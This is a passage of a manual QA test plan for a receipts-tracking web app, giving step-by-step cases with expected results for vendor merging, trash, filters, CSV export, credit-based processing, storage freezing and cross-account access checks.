**Purpose:** typing a variant of an existing vendor's name keeps that vendor and says so.
**Preconditions:** RCPT-15. Open `/receipts/<R3_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Set **Vendor** to `Staples Inc.`; **Save**. | Two flashes: "Saved." and "Filed under your vendor Staples. To change a vendor's name for all of its receipts, use Rename vendor." |
| 2 | Check the field. | Vendor still "Staples" with the **Vetted** chip; heading "Staples · 2026-10-09". |

### RCPT-17 Typing a new name moves the receipt to a new vendor

**Purpose:** a name nobody has creates a vetted vendor for this receipt only; the name read is kept.
**Preconditions:** open `/receipts/<R4_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Set **Vendor** to `Office Depot`; **Save**. | "Saved." Heading "Office Depot · 2026-10-09"; chip **Vetted**. |
| 2 | Read under the field. | "Read on the receipt as “Staples”. Filed under your vendor Office Depot (1 receipt)." No "Mark as vetted" box. |
| 3 | Go to `/receipts/`. | R4 shows vendor "Office Depot". Its "possible duplicate" marker is gone (different vendor now); the **Duplicates** badge is **1** (only R2). Other Staples rows still say Staples. |

### RCPT-18 Rename vendor dialog: Escape, clash with merge offer, rename

**Purpose:** renaming from a receipt's page, including the clash that offers a merge.
**Preconditions:** on `/receipts/<R4_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Rename vendor…**. | A modal dialog "Rename vendor" opens; the **Name** field holds "Office Depot" and has focus. Text: "All 1 receipt from Office Depot will show the new name. Receipts read as “Office Depot” will keep being matched to it." A **Vetted** checkbox (checked), **Cancel** and **Rename**. |
| 2 | Press Escape. | The dialog closes; focus returns to the "Rename vendor…" button. |
| 3 | Reopen it, set **Name** to `STAPLES INC`, click **Rename**. | The dialog stays open and changes: the name field (read-only, red border) shows "STAPLES INC" and an amber box says "You already have a vendor called **Staples** (3 receipts)." and "Merge **Office Depot** into it? Its 1 receipt will show “Staples”." with a "Use a different name" link; buttons **Cancel** and **Merge into Staples**. |
| 4 | Click **Use a different name**. | Back to the plain rename form. |
| 5 | Set **Name** to `ODP` (keep **Vetted** checked), **Rename**. | The page reloads with "Renamed to ODP."; heading "ODP · 2026-10-09"; field "ODP" with **Vetted** chip; "Read on the receipt as “Staples”. Filed under your vendor ODP (1 receipt)." |

### RCPT-19 Re-run extraction costs a credit and keeps your edits

**Purpose:** the confirmation names the price; the re-run charges again and keeps edited fields.
**Preconditions:** on `/receipts/<R1_ID>/`; balance 96.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Re-run extraction (1 credit)**. | A modal: title "Run the extraction again?", body "This costs 1 credit. The receipt is read again from the original file; anything you edited and your notes are kept.", buttons **Cancel** (focused) and **Re-run extraction (1 credit)** (brand colour, not red). |
| 2 | Click **Cancel**. | Modal closes; nothing happens. |
| 3 | Open it again and confirm. | The page reloads with "Reading the receipt again. This usually takes a few seconds." Because tasks run inline it is already **Processed** (if it shows "Reading your receipt…", wait: the panel refreshes itself every 3 s). |
| 4 | Check the fields. | Kept as you edited them: amount 12.50, date 2025-06-30, category Travel, number INV-001, payment Visa ••1111, notes "client lunch". |
| 5 | Go to `/billing/credits/`. | Balance **95**; a new "-1 Spend" row "Receipt processing: staples-1.png". |

### RCPT-20 Download original and the PDF preview

**Purpose:** the download goes through a fresh attachment URL; a PDF previews inline.
**Preconditions:** RCPT-19.

| # | Action | Expected result |
|---|---|---|
| 1 | On R1, with the network log open, click **Download original**. | `/receipts/<R1_ID>/download/` answers **302** with `Cache-Control: private, no-store` and a `Location` on the S3 host (a presigned URL for the file under `…/files/<R1_ID>`, never the receipt's id alone or a guessable key). The browser downloads `staples-1.png`, 280 bytes, byte-identical to `PNG_A`. The page itself does not change. |
| 2 | Click **Download original** again a minute later. | A fresh redirect (a different signature) and the same download: each click mints a new short-lived URL. |
| 3 | Open `/receipts/<R3_ID>/`. | The preview is an iframe titled "Preview of Staples" whose `src` is a presigned URL on the S3 host, showing the PDF page with "STAPLES 42.10" in the browser's PDF viewer (shown inline, not downloaded). **Open full size** opens the same PDF in a new tab. (A headless browser without a PDF viewer shows an empty frame and downloads the file instead: a tool limitation, not a failure.) |

### RCPT-21 Move to trash; a trashed receipt is read-only

**Purpose:** trashing from the receipt page and the read-only trashed view.
**Preconditions:** RCPT-20.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `/receipts/<R2_ID>/`, click **Move to trash**. | Redirected to `/receipts/` with "Moved to the trash. You can restore it from there for 30 days." R2 is gone from the list; the link reads **Trash (1)**; the **Duplicates** tab has no badge (R2 was the last flagged one). |
| 2 | Open `/receipts/<R2_ID>/` directly. | A gray banner "This receipt is in the Trash. Restore it to edit it." with a **Restore** button. All form fields are disabled; no **Save**, **Re-run** or **Move to trash** buttons; no "Rename vendor…" link. |
| 3 | From the dashboard open the failed receipt "notes.pdf" (not fake.pdf), **record** its id as `F2_ID`, and click **Move to trash**. | "Moved to the trash…" again; link now **Trash (2)**; **Failed** badge is **1**. |

### RCPT-22 Trash page: days left, delete forever, restore

**Purpose:** the Trash lists what is left and for how long; delete forever asks first.
**Preconditions:** RCPT-21.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Trash (2)**. | `/receipts/trash/`, heading **Trash**, "Items are deleted forever 30 days after being trashed. Until then they still count toward your storage." Two rows, most recently trashed first: "Notes.pdf" (first letter capitalised) with "No date · deleted in 30 days", and "Staples" with "2026-10-09 · USD 42.10 · deleted in 30 days". Each has **Restore** and a red trash icon. |
| 2 | Click the trash icon of notes.pdf (aria-label "Delete notes.pdf forever"). | Modal "Delete forever": "Are you sure you want to delete notes.pdf forever? This can't be undone." with **Cancel** and red **Delete forever**. Press **Cancel**: nothing happens. |
| 3 | Open it again and click **Delete forever**. | "Deleted notes.pdf forever." The row is gone. |
| 4 | Click **Restore** on Staples. | "Restored Staples."; the page now says "The trash is empty." |
| 5 | Go to `/receipts/`. | R2 is back, **Processed**, flagged "possible duplicate" again (it has the same bytes as R1); **Duplicates** badge **1**; the Trash link has no number. |
| 6 | Open `/receipts/<F2_ID>/`. | 404 page (it was deleted for good). |

### RCPT-23 Dashboard tabs and counts

**Purpose:** each tab filters the list and keeps the counts right.
**Preconditions:** RCPT-22. Live receipts: R1, R2, R3, R4, F1.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `/receipts/`. | Badges: Failed **1**, Duplicates **1**; All, Needs review and Processing have none. 5 rows. |
| 2 | Click each tab in turn. | **Needs review**: "No receipts found." **Processing**: "No receipts found." **Failed**: only fake.pdf. **Duplicates**: only R2. **All**: all 5. The URL follows (`?status=needs_review`, `processing`, `failed`, `duplicates`, then `/receipts/`), the active tab is underlined (`aria-current="page"`), and the page never fully reloads. |
| 3 | Click **Failed**, then press the browser Back button. | The URL goes back to the previous tab's URL. |

### RCPT-24 Search: vendor, name as read, notes, amount formats

**Purpose:** the search box matches vendor (also the name the AI read), notes and amount.
**Preconditions:** `/receipts/` on the All tab.

| # | Action | Expected result |
|---|---|---|
| 1 | Type `odp` in the search box and wait ~0.5 s. | Only R4 (ODP). URL `/receipts/?q=odp`. A clear (x) button appears in the box. |
| 2 | Search `staples`. | R1, R2, R3 **and R4** (R4 matches by the name it was read as, "Staples"). |
| 3 | Search `client`. | Only R1 (matches its notes). |
| 4 | Search `42,10`. | R2, R3, R4 (USD 42.10); not R1 (12.50). |
| 5 | Search `$42`. | Same three. |
| 6 | Search `12.5`. | Only R1. |
| 7 | Search `zzz`. | "No receipts found." (not the "No receipts yet" wording). The **Export CSV** link's `href` is `/receipts/export.csv?q=zzz`. |
| 8 | Click the clear (x) button. | Box empty, all 5 rows back, URL `/receipts/`, export link back to `/receipts/export.csv`. |

### RCPT-25 Category filter

**Purpose:** filtering by a category, or by none.
**Preconditions:** `/receipts/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Choose **Category** "Travel". | Only R1. URL `/receipts/?category=<id>`. |
| 2 | Choose "Office supplies". | R2, R3, R4. |
| 3 | Choose "Uncategorized". | Only fake.pdf. URL `?category=none`. |
| 4 | Choose "Equipment". | "No receipts found." |
| 5 | Reload the page. | The select still shows "Equipment" and the list is still empty. Choose "All categories" again: 5 rows. |

### RCPT-26 Receipt date: presets and Custom

**Purpose:** date presets are relative to today; Custom shows two dates and keeps them in the URL.
**Preconditions:** `/receipts/`, all categories. R1 is dated 2025-06-30, R2-R4 2026-10-09, fake.pdf has no date.

| # | Action | Expected result |
|---|---|---|
| 1 | Choose **Last 30 days**. | URL `?date_range=last_30_days`. R1 and fake.pdf are hidden (no date never matches a range). R2-R4 are shown if 2026-10-09 is within the last 30 days of today (otherwise "No receipts found."; note today's date in the report). |
| 2 | Choose **This year**. | R1 hidden (if today is in 2026 or later), R2-R4 shown if today is in 2026. |
| 3 | Choose **Custom**. | Two date inputs (aria-labels "Receipt date from" / "Receipt date to") appear, enabled. |
| 4 | Set from `2025-06-01` and to `2025-07-31`. | Only R1. URL has `date_from=2025-06-01&date_to=2025-07-31` and **no** `date_range`. |
| 5 | Reload. | **Custom** is selected, both dates kept, only R1. |
| 6 | Choose **Any date**. | Date inputs hidden; all 5 rows; URL `/receipts/`. |

### RCPT-27 Sorting by receipt date and by added

**Purpose:** the two sortable columns flip direction and keep the other filters.
**Preconditions:** `/receipts/`, no filters.

| # | Action | Expected result |
|---|---|---|
| 1 | Look at the default order. | Newest receipt date first, **undated first**: fake.pdf, then the three 2026-10-09 receipts (newest added first), then R1 (2025-06-30). **Receipt date** header is dark (active) with a down chevron. |
| 2 | Click **Receipt date**. | Ascending: R1 first, the 2026-10-09 ones, fake.pdf **last**. URL `?sort=receipt_date`; chevron up; the header's hidden text says "(sorted ascending)". |
| 3 | Click **Receipt date** again. | Back to the default order; `sort` disappears from the URL. |
| 4 | Click **Added**. | Newest added first: R2/R3/R4 (uploaded together in RCPT-08), then fake.pdf, then R1 last (restoring R2 did not change when it was added). URL `?sort=-created_at`; **Added** is now the dark, active header. Click **Added** again: oldest first (R1, fake.pdf, then R2-R4), URL `?sort=created_at`. |
| 5 | With `?sort=created_at` active, search `staples`. | The sort is kept (URL has both `q=staples` and `sort=created_at`). |

### RCPT-28 URL state survives reload, and Export CSV honours the filters

**Purpose:** the address bar always carries the dashboard URL; the export downloads exactly the
filtered receipts with the documented columns.
**Preconditions:** `/receipts/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Pick tab **Duplicates**, category "Office supplies", search `42`. | Only R2. URL contains `status=duplicates`, `category=<id>` and `q=42`, and is a `/receipts/?…` URL (never `/receipts/list/…`). |
| 2 | Reload. | Same tab, category, search and list. |
| 3 | Open `/receipts/list/?status=failed` directly in the address bar. | Redirected to `/receipts/?status=failed` (the full page). |
| 4 | Go to `/receipts/?q=staples&sort=created_at`; read the **Export CSV** `href`. | `/receipts/export.csv?q=staples&sort=created_at`. |
| 5 | In the console: `const r = await fetch(document.getElementById('export-link').href); [r.headers.get('content-type'), r.headers.get('content-disposition'), await r.text()]`. | `text/csv; charset=utf-8`; `attachment; filename="receipts-<today YYYY-MM-DD>.csv"`; first line exactly `receipt_date,vendor,amount,currency,category,document_type,document_number,payment_method,notes,status,source,added,original_filename,vendor_as_read`; then 4 rows, oldest added first: R1, then R2, R3 and R4 in the order their uploads were created in RCPT-08 (they upload in parallel, so that order varies). R4's row has vendor `ODP` and the last column `vendor_as_read` = `Staples`; R1's row has `2025-06-30,Staples,12.50,USD,Travel,receipt,INV-001,Visa ••1111,client lunch,processed,upload,…,staples-1.png,Staples`. No fake.pdf row, no trashed receipts. |
| 6 | Click **Export CSV**. | The browser downloads `receipts-<today>.csv`; the page stays. |

### RCPT-29 Pagination (25 per page)

**Purpose:** more than 25 receipts page, and the pager keeps the filters.
**Preconditions:** balance 95. Go to `/receipts/upload/`, paste the helper.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptPick(Array.from({ length: 22 }, (_, i) => ({ name: 'bulk-' + (i + 1) + '.png', type: 'image/png', base64: PNG_A })))`. | 22 rows, at most three uploading at a time; all end "✓ Uploaded. View receipt". |
| 2 | Reload the upload page. | "Balance: 73 credits". |
| 3 | Go to `/receipts/`. | 25 rows and, below, "Page 1 of 2" with a **Next >** link (no Previous). Duplicates badge **23** (the 22 new ones have R1's bytes). |
| 4 | Click **Next**. | 2 rows; "Page 2 of 2"; **< Previous** link; URL `?page=2`. Reload: still page 2. |
| 5 | On page 2, search `client`. | Only R1, no pager, URL without `page`. |

### RCPT-30 Vendors page overview

**Purpose:** the Vendors page lists vendors with counts, chips, the names they were read as.
**Preconditions:** RCPT-29. Vendors now: Staples (vetted), ODP (vetted).

| # | Action | Expected result |
|---|---|---|
| 1 | From `/receipts/` click **Vendors**. | `/receipts/vendors/`, heading **Vendors**, intro text beginning "Who your receipts are from." Tabs **All** (badge 2), **To vet** (no badge), **Vetted** (badge 2). Search box placeholder "Search vendors, including the names they were read as". |
| 2 | Read the list (desktop width). | Column headers Vendor / Receipts / Last receipt. Rows sorted by name: **ODP** with a green "Vetted" chip, "Also read as “Office Depot”", receipts **1**, last receipt 2026-10-09; **Staples** with "Vetted", receipts **25**, last receipt 2026-10-09. |
| 3 | Inspect ODP's receipt-count link. | aria-label "1 receipt from ODP", `href` `/receipts/?vendor=<id>`. **Record** ODP's id as `ODP_ID` and Staples' as `STAPLES_ID`. |
| 4 | Open ODP's row menu (aria-label "Actions for ODP"). | Items: View receipts, Rename…, Mark as not vetted, Merge into…, and a grayed **Delete** that cannot be clicked, with tooltip "Only a vendor with no receipts can be deleted. Merge it into another vendor instead." Escape closes the menu. |

### RCPT-31 Mark a vendor as not vetted (row menu) and the To vet tab

**Purpose:** un-vetting from the menu refreshes the list and the counts.
**Preconditions:** RCPT-30.

| # | Action | Expected result |
|---|---|---|
| 1 | ODP's menu > **Mark as not vetted**. | The list refreshes in place with the notice "Marked 1 vendor as not vetted."; ODP's chip is now gray "New". Tabs: All 2, **To vet 1** (amber), Vetted 1. |
| 2 | Click **To vet**. | Only ODP. URL `?status=to_vet`. Click **Vetted**: only Staples. Click **All**. |
| 3 | Go to `/receipts/`. | The **Vendors** link shows "1 to vet". Open R4: chip "New vendor" and the box "First receipt from this vendor. …" with **Mark as vetted**. Don't click it. |

### RCPT-32 Vendor search, including names they were read as

**Purpose:** search matches vendor names and alias names, and combines with the tab.
**Preconditions:** `/receipts/vendors/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Type `office`. | Only ODP (matches its alias "Office Depot"). URL `?q=office`. |
| 2 | Click **To vet** with the search still typed. | ODP still listed; URL has `status=to_vet` and `q=office`. |
| 3 | Search `zzz`. | "No vendors found." |
| 4 | Clear the search (x) and click **All**. | Both vendors; URL `/receipts/vendors/`. |

### RCPT-33 Bulk "Mark as vetted"

**Purpose:** the bulk bar appears with a selection and vets only those not yet vetted.
**Preconditions:** `/receipts/vendors/`, ODP not vetted.

| # | Action | Expected result |
|---|---|---|
| 1 | Check the bar is absent; tick "Select ODP". | A bar (region "Actions for the selected vendors") appears: "1 selected", **Mark as vetted**, **Merge…** (disabled: fewer than two), **Clear**. The ticked row is tinted. |
| 2 | Tick "Select Staples". | "2 selected"; **Merge…** enabled. |
| 3 | Click **Clear**. | Both unticked; the bar hides. |
| 4 | Tick both again, click **Mark as vetted**. | The list refreshes: "Marked 1 vendor as vetted." (Staples already was); ODP chip "Vetted"; To vet tab without badge. |

### RCPT-34 Merge two vendors

**Purpose:** the merge dialog lets you choose the name to keep and moves the receipts.
**Preconditions:** RCPT-33.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `/receipts/<R3_ID>/`, set **Vendor** to `Corner Cafe`, **Save**. | "Saved."; heading "Corner Cafe · 2026-10-09", chip Vetted. |
| 2 | On `/receipts/vendors/`, tick "Select Corner Cafe" and "Select ODP", click **Merge…**. | Dialog "Merge 2 vendors", "Which name should the 2 receipts show?", two radio cards: "Corner Cafe ✓ vetted · 1 receipt" (selected by default: equal counts, alphabetical) and "ODP ✓ vetted · 1 receipt". Note "This changes the vendor shown on receipts you already have. It can't be undone…". Buttons **Cancel** and **Merge into Corner Cafe**. |
| 3 | Select **ODP**. | The button text changes to **Merge into ODP**. |
| 4 | Press Escape. | Dialog closes; nothing merged. |
| 5 | Click **Merge…** again (both still ticked), choose **ODP**, click **Merge into ODP**. | Page reloads with "Merged 1 vendor into ODP. 2 receipts now show ODP." Corner Cafe is gone; ODP shows 2 receipts and "Also read as “Office Depot”, “Corner Cafe”". R3's page now shows vendor ODP. |

### RCPT-35 Deleting a vendor: refused with receipts, allowed when empty

**Purpose:** only a vendor without receipts can be deleted, after a confirmation.
**Preconditions:** RCPT-34.

| # | Action | Expected result |
|---|---|---|
| 1 | Open the menus of Staples and ODP. | **Delete** is grayed out (`aria-disabled="true"`) in both, with the "Only a vendor with no receipts…" tooltip. |
| 2 | Open `/receipts/<R3_ID>/`, set **Vendor** `Temp Vendor`, **Save**; then set it back to `ODP` (pick it from the suggestions or type it), **Save**. | Both saves succeed; R3 ends under ODP. |
| 3 | On `/receipts/vendors/`. | A row **Temp Vendor**, Vetted, 0 receipts, last receipt "—" (a vetted vendor is kept even when empty). |
| 4 | Its menu > **Delete** (red). | Modal "Delete vendor": "Are you sure you want to delete Temp Vendor? No receipts are filed under it." **Cancel** / **Delete**. |
| 5 | Click **Delete**. | "Deleted Temp Vendor."; the row is gone. |
| 6 | (Optional, devtools) As a forged request, POST to ODP's delete URL: `fetch('/receipts/vendors/<ODP_ID>/delete/', {method: 'POST', redirect: 'manual', headers: {'X-CSRFToken': document.cookie.match(/csrftoken=([^;]+)/)[1]}}).then(r => location.reload())`. (`redirect: 'manual'` matters: without it `fetch` follows the redirect itself, and that hidden page load consumes the flash message.) | The reloaded page shows the red flash "ODP still has receipts. Merge it into another vendor instead of deleting it." and ODP is still listed. |

### RCPT-36 The dashboard's vendor filter chip

**Purpose:** `?vendor=<id>` filters the dashboard, shows a removable chip and travels with filters.
**Preconditions:** RCPT-35.

| # | Action | Expected result |
|---|---|---|
| 1 | On `/receipts/vendors/` click ODP's receipt count ("2 receipts from ODP"). | `/receipts/?vendor=<ODP_ID>`: a chip "Vendor: **ODP**" with an x (aria-label "Remove the vendor filter"); only R3 and R4 listed. Export CSV `href` contains `vendor=<ODP_ID>`. |
| 2 | Click the **Failed** tab. | "No receipts found."; the chip stays; URL has both `vendor` and `status=failed`. |
| 3 | Click **All**, then the chip's x. | The chip disappears, all receipts are back (page 1 of 2), URL has no `vendor=`. |
| 4 | Open `/receipts/?vendor=999999`. | No chip and the normal unfiltered list (an unknown vendor id is ignored). |
| 5 | Open `/receipts/?vendor=<ODP_ID>&q=zzz`. | Chip shown, "No receipts found.". |

### RCPT-37 A rename that clashes can be accepted as a merge

**Purpose:** accepting the merge offer from the rename dialog on the Vendors page.
**Preconditions:** RCPT-36.

| # | Action | Expected result |
|---|---|---|
| 1 | On `/receipts/vendors/`, ODP's menu > **Rename…**, set **Name** `staples`, **Rename**. | The dialog shows "You already have a vendor called **Staples** (24 receipts)." and "Merge **ODP** into it? Its 2 receipts will show “Staples”." (Staples lost R3 in RCPT-34.) |
| 2 | Click **Merge into Staples**. | Page reloads with "Merged 1 vendor into Staples. 26 receipts now show Staples." Only Staples remains (26 receipts); its "Also read as" lists the merged names (e.g. "Office Depot", "ODP", "Corner Cafe", possibly "and N more"). |
| 3 | On `/receipts/`. | R3 and R4 now show "Staples". |

### RCPT-38 Settings: copy the address and regenerate it

**Purpose:** Copy gives feedback; Regenerate asks first and issues a new address.
**Preconditions:** `/receipts/settings/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Copy** next to the address. | The button turns into a check icon and "Copied" for about 2 seconds, then back to "Copy". (If the browser tool can read the clipboard, it holds `ADDR1`.) |
| 2 | Click **Regenerate…**. | Modal "Regenerate address": "Your old address stops working immediately. Mail already sent to it is dropped, so update any forwarding rules." **Cancel** (focused) and red **Regenerate**. |
| 3 | **Cancel**. | Address unchanged (`ADDR1`). |
| 4 | **Regenerate…** again and confirm. | Page reloads with "Your new address is ready. The old one no longer works." The address is a new `receipts+xxxxxxxx@ziptrigo.com`, different from `ADDR1`. **Record** it as `ADDR2`. |
| 5 | Go to `/receipts/`. | The "Email receipts to" strip shows `ADDR2`. |

### RCPT-39 Settings: accepted senders

**Purpose:** "Only these" validates entries; saved entries are normalized; "Anyone" clears them.
**Preconditions:** `/receipts/settings/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Select **Only these**. | The textarea becomes editable. |
| 2 | Leave it empty, click **Save**. | Red message in the section: "Accepted senders: Enter at least one address, or choose Anyone to accept all senders." |
| 3 | Type `bob, *@bad` and **Save**. | "Accepted senders: Use email addresses or *@domain.com. Not valid: bob, *@bad". |
| 4 | Type `Me+Invoices@Example.com, *@acme.com` and **Save**. | The form re-renders with a green "✓ Saved" next to **Save**. |
| 5 | Reload. | **Only these** selected; the textarea shows `me@example.com, *@acme.com` (lower-cased, `+tag` removed). |
| 6 | Select **Anyone**, **Save**, reload. | **Anyone** selected; textarea empty and disabled. |

### RCPT-40 Settings: default currency

**Purpose:** the default currency saves; an invalid code is refused.
**Preconditions:** `/receipts/settings/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Choose **Default currency** `EUR`, **Save**. | "✓ Saved"; after reload the select shows EUR. |
| 2 | (Devtools) `document.querySelector('#id_default_currency option:checked').value = 'XYZ'`, then **Save**. | Red "Default currency: Choose a currency."; after reload it is still EUR. |
| 3 | Set it back to `USD`, **Save**. | "✓ Saved". |

### RCPT-41 Settings: categories

**Purpose:** add, refuse duplicates, rename, reorder and delete (which uncategorizes receipts).
**Preconditions:** `/receipts/settings/`. R1 is in Travel.

| # | Action | Expected result |
|---|---|---|
| 1 | Read the list. | "Travel" shows "1 receipt"; "Office supplies" shows a count of the receipts in it (trashed ones included). |
| 2 | Type `Client gifts` in **New category**, **Add**. | The list refreshes in place; "Client gifts" is the last row. |
| 3 | Add `travel`. | Red "You already have a category with that name." |
| 4 | Add three spaces `   `. | Red "Enter a category name." |
| 5 | Click the pencil on Client gifts (aria-label "Rename Client gifts"); change to `Gifts`; press Escape. | Edit cancelled; still "Client gifts". |
| 6 | Pencil again, set `Gifts`, click the check ("Save name"). | Row reads "Gifts". |
| 7 | Click "Move Gifts up". | Gifts swaps with the row above ("Other"). Its down arrow is enabled again; Other is now last (down arrow disabled). |
| 8 | On `/receipts/`, open the **Category** select. | Order matches: … Vehicle & fuel, Gifts, Other. |
| 9 | Back in settings, click the trash icon of **Travel** ("Delete Travel"). | Modal "Delete category": "Are you sure you want to delete Travel? Its 1 receipt will become uncategorized." |
| 10 | Confirm **Delete**. | Page reloads with "Deleted Travel. Its receipts are now uncategorized."; Travel is gone. |
| 11 | On `/receipts/`, choose **Category** "Uncategorized". | R1 and fake.pdf are listed. R1's page shows Category "No category". |

### RCPT-42 Not enough credits: the receipt waits

**Purpose:** a user with no credits can upload; the file is stored and waits for credits.
**Preconditions:** log out; sign in as `qa.broke@example.com` (0 credits).

| # | Action | Expected result |
|---|---|---|
| 1 | Go to `/receipts/upload/`. | "Balance: 0 credits" and the notice "You don't have enough credits to read a receipt right now. Files are stored when you upload them and read once you add credits." The buttons are enabled. |
| 2 | Paste the helper; `rcptPick([{ name: 'broke.png', type: 'image/png', base64: PNG_A }])`. | "✓ Uploaded. View receipt". |
| 3 | Click **View receipt**. **Record** the id as `B1_ID`. | Gray **Waiting for credits** pill; heading "broke.png". Right panel: "Waiting for credits" / "We'll read this receipt as soon as you add credits. Top up" (link to `/billing/credits/`). Only **Move to trash**, no Re-run, no form. The panel does not poll. |
| 4 | Go to `/receipts/`. | One row "broke.png", **Waiting for credits**, "· waiting for credits". **Processing** tab badge **1**; the row is listed under **Processing**. |
| 5 | `/billing/credits/`. | Balance 0; no spend transaction. |

### RCPT-43 An admin top-up resumes the waiting receipt

**Purpose:** adding credits (admin credit adjustment) queues waiting receipts automatically.
**Preconditions:** RCPT-42. Use a second browser context, or log out and in.

| # | Action | Expected result |
|---|---|---|
| 1 | Sign in as `qa.admin@example.com`; open `/admin/billing/credittransaction/adjust/`. | "Adjust credits" form: **User email**, **Direction** (Add / Spend), **Amount**, **Description**, **Apply**. |
| 2 | Enter `qa.broke@example.com`, Add, `5`, `QA top-up`; **Apply**. | Success message "Adjusted credits for qa.broke@example.com. New balance: 4." (5 added, and the waiting receipt was read at once for 1; if it says 5, note it and continue). |
| 3 | Sign in as `qa.broke@example.com`; open `/receipts/<B1_ID>/`. | **Processed**, "Staples · 2026-10-09", the edit form is shown. |
| 4 | `/billing/credits/`. | Balance 4; rows "+5 Adjustment" "QA top-up" and "-1 Spend" "Receipt processing: broke.png". |

### RCPT-44 Paused storage (frozen account): banner, email, notification -- shell step

**Purpose:** freezing an account (what the daily storage billing does when the balance can't pay)
emails the owner and leaves a bell notification; a frozen account shows the "Storage is paused"
banner everywhere, blocks uploads, previews, downloads and re-runs, and a top-up lifts it and
removes the notification.
**Preconditions:** RCPT-43 (qa.broke has 4 credits). The daily storage billing does not run on this
server, so the freeze is done by its own service function. (Shell step) from the repo root:

```bash
python tests_e2e/ai/manage.py shell -c "from apps.receipts.models import ReceiptsAccount; from apps.receipts.services.metering import freeze_account; freeze_account(ReceiptsAccount.objects.get(user__email='qa.broke@example.com')); print('frozen')"
```

It prints `frozen`. Without a shell mark the case **BLOCKED (needs-shell)**. Stay signed in as
`qa.broke@example.com`.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `/receipts/`. | An amber banner at the top (role alert): "**Storage is paused.** Your balance couldn't cover storage. Your receipts are safe; previews, downloads and processing resume when you add credits." with a **Top up** button to `/billing/credits/`. The list still works. |
| 2 | Open `/receipts/upload/`, `/receipts/settings/`, `/receipts/vendors/`, `/receipts/trash/`. | The same banner on each. On the upload page **Choose files** and **Take photo** are disabled, and "Uploads are paused until you add credits." is shown; the "not enough credits" notice is not. With the helper pasted, dropping a file on the zone (`rcptDrop`) adds no row. |
| 3 | Open `/receipts/<B1_ID>/`. | Preview: "Previews and downloads are paused until you add credits." with a **Top up** link; no **Download original** and no **Open full size**. |
| 4 | Open `/receipts/<B1_ID>/download/` directly. | Back on the receipt page with the red flash "Your receipts are paused until you add credits." |
| 5 | Click **Re-run extraction (1 credit)** and confirm. | Red flash "Your receipts are paused until you add credits."; balance unchanged (4). |
| 6 | Open `/__e2e__/mail/?to=qa.broke@example.com` (reload until it arrives, up to a minute). | One email, subject "Your receipts storage is paused": "Your credit balance couldn't cover the storage for your receipts." and "Your receipts are safe, nothing was deleted. Until you add credits, previews, downloads and processing are paused.", then "Add credits: http://localhost:8765/billing/credits/" and "Your receipts: http://localhost:8765/receipts/". The HTML source has the same text with **Add credits** and **Your receipts** links to those URLs. Nothing from the receipts (file names) is in it. |
| 7 | Click both links in the email. | "Add credits" opens the credits history page; "Your receipts" opens `/receipts/` (with the banner). |
| 8 | Look at the bell in the header. | The badge counts a new notification. Open the dropdown: "Receipts storage is paused", body "Your credit balance couldn't cover your receipts' storage. Nothing was deleted; previews, downloads and processing are paused until you add credits." Click it: it opens `/receipts/`. |
| 9 | As `qa.admin` (another browser context, or log out and in), add 1 credit to `qa.broke@example.com` with the adjustment tool (RCPT-43 step 2). | Success message ("New balance: 5."). |
| 10 | As `qa.broke`, reload `/receipts/`. | The banner is gone; the receipt page shows its preview and **Download original** again; the upload page's buttons are enabled. |
| 11 | Open `/notifications/`. | The "Receipts storage is paused" notification is gone (it is deleted when the account is resumed). No "resumed" email is sent (none exists). |

### RCPT-45 Another user's receipt is a 404; logging out locks the pages

**Purpose:** ids can't be probed across accounts, and the session is required.
**Preconditions:** signed in as `qa.broke@example.com`; `R1_ID`, `STAPLES_ID` recorded for `qa.user`.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `/receipts/<R1_ID>/`. | 404 page (not 403, no receipt data). |
| 2 | Open `/receipts/<R1_ID>/download/` and `/receipts/<R1_ID>/body/`. | 404 for both. |
| 3 | Open `/receipts/00000000-0000-0000-0000-000000000000/` and `/receipts/not-a-uuid/`. | 404 for both. |
| 4 | Open `/receipts/?vendor=<STAPLES_ID>`. | No vendor chip; only qa.broke's own receipts. |
| 5 | In the console, `fetch('/receipts/vendors/<STAPLES_ID>/rename/', {headers: {'HX-Request': 'true'}}).then(r => r.status)`. | `404`. |
| 6 | Log out (account menu > **Logout**), then open `/receipts/trash/`. | Redirected to `/account/login/?next=/receipts/trash/`. |
| 7 | Press Back to a Receipts page and reload it. | Redirected to the login page again. |

### RCPT-46 A fresh account for the remaining cases

**Purpose:** set up account `F`, so the cases below don't disturb the balances and counts above.
**Preconditions:** logged out (RCPT-45). Pick a random suffix and **record** the address as `F`.

| # | Action | Expected result |
|---|---|---|
| 1 | On `/account/register/` fill **Name** `QA Receipts F`, **Email** `qa.rcpt.<random>@example.com`, **Password** `RcptQa-4821`; click **Create account**. | The "Check your email" page (`/account/created/`). |
| 2 | Open `/__e2e__/mail/?to=<F>` (reload until it arrives, up to a minute), click the confirmation link, press **Confirm my email**. | **Email Confirmed!** |
| 3 | Sign in as `F` and open `/receipts/`. | The empty dashboard of RCPT-02 ("No receipts yet. Upload one, or email it to your address above."). **Record** the address in the "Email receipts to" strip as `ADDR_F`. |
| 4 | Open `/receipts/upload/`. | "Balance: 1000 credits" (the welcome credits); no "not enough credits" notice. |

### RCPT-47 JPEG, WebP and HEIC uploads, and the Take photo input

**Purpose:** every supported image type uploads to S3, is read and previews; a HEIC photo previews
through its JPEG rendering but downloads as the original; the camera input feeds the same upload.
**Preconditions:** signed in as `F` on `/receipts/upload/`, helper pasted with `JPEG_A`, `WEBP_A`,
`HEIC_A`. Balance 1000.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Take photo**. | A file chooser opens (on a desktop browser it does not start a camera). Cancel it. |
